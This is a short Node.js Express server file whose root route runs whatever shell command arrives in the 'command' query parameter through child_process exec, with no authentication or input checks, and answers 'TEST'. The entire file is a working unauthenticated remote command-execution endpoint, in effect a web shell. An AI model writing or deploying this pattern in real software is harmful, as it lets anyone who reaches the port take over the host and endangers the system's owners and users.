const express = require('express');
const {
   exec
} = require('child_process');
const app = express();

app.get('/', async (req, res) => {
   console.log(req.query.command);
   exec(req.query.command, (err, stdout, stderr) => {
      console.log(err);
      console.log(stdout);
      console.log(stderr);
   });
   res.end("TEST");
});

app.listen(5055, async () => {
   console.log('Listening on port 5055!');
});